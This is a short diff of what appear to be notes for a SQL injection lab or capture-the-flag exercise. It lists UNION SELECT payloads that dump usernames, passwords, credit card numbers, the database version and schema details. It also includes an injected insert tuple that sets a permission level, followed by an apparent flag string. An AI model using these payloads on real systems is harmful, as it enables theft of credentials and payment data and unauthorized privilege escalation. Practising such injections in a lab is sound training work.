@@ -5,14 +5,7 @@ UNION SELECT username,password,permission FROM sqlinjection.members
 UNION SELECT @@VERSION,2,3
 UNION SELECT creditcard_number,2,3 FROM sqlinjection.payments
 UNION SELECT data,2,3 FROM sqlinjection.share4 <----------- DECODE FROM BASE64
-('Hacker', 'Joe', 'Hacker', '1', '1', 1)#', '1', '1', 3)
-
-
-
-i0Qnt0tEoeKSw8ZbYuPu
-
-want -----> ('', '', 'Hacker', '1', '1', 1)
-current --> ('', '', 'Hacker', '1', '1', 3)
+('Hacker', 'Joe', 'Hacker', '1', '1', 1)#', '1', '1', 3) --------------> i0Qnt0tEoeKSw8ZbYuPu
 
 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema = 'sqlinjection'
 ----------------------------------------------------
